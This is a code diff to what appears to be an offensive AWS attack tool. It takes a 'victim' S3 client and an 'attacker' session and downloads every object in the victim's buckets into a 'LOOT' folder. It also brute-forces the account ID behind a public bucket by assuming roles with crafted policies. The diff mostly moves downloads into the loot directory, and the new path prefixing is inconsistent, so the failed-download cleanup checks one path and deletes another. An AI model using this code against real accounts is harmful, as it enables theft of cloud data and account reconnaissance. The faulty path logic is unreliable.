@@ -5,6 +5,8 @@ from modules.utils import custom_serializer
 from aws_assume_role_lib import assume_role
 from botocore.exceptions import ClientError
 
+BASE_DOWNLOAD_PATH = "LOOT/S3_Buckets/"
+
 def s3_init_enum(victim_s3_client, attacker_session):
     buckets = my_globals.victim_buckets
     buckets = list(buckets or [])  # Prevent list type error
@@ -84,12 +86,12 @@ def get_bucket_policy(s3_client, buckets):
 
 
 def ensure_dir_for_file(path):
-    directory = os.path.dirname(path)
+    directory = os.path.dirname(BASE_DOWNLOAD_PATH + path)
     if directory and not os.path.exists(directory):
         os.makedirs(directory, exist_ok=True)
 
 def delete_failed_files(path):
-    if path and os.path.exists(path):
+    if path and os.path.exists(BASE_DOWNLOAD_PATH + path):
         os.remove(path)
 
 def download_bucket_objects(s3_client, buckets):
@@ -118,14 +120,16 @@ def download_bucket_objects(s3_client, buckets):
 
                 local_path = os.path.join(bucket, key)
                 ensure_dir_for_file(local_path)
+                local_path = BASE_DOWNLOAD_PATH + local_path
 
                 try:
                     with open(local_path, "wb") as f:
                         s3_client.download_fileobj(bucket, key, f)
                 except KeyboardInterrupt:
                     raise
-                except:
-                    # Delete file if download failed
+                except Exception as e:
+                    #print(f"\nError downloading {key}: {e}")
+                    # Delete the file if download failed
                     delete_failed_files(local_path)
                     failed += 1
 
@@ -141,6 +145,7 @@ def download_bucket_objects(s3_client, buckets):
             sys.stdout.write(" " * shutil.get_terminal_size((80, 20)).columns + "\r")
             print(f"{Fore.LIGHTBLACK_EX}Can't process bucket {bucket}: {e}")
 
+# Brute-force AWS Account ID from a public bucket
 def brute_force_aws_account_id(public_buckets, s3_role_arn, attacker_session):
     public_bucket = public_buckets[0]
     print(f"{Fore.GREEN}Attempting to brute-force AWS account ID for bucket: {public_bucket}")
@@ -183,6 +188,7 @@ def get_policy(digits: str):
         ],
     }
 
+# Helper function which assumes a role for a public bucket to guess the AWS account ID for this bucket
 def can_access_with_policy(session, bucket, key, role_arn, policy):
     if not policy:
         assumed_role_session = assume_role(session, role_arn)
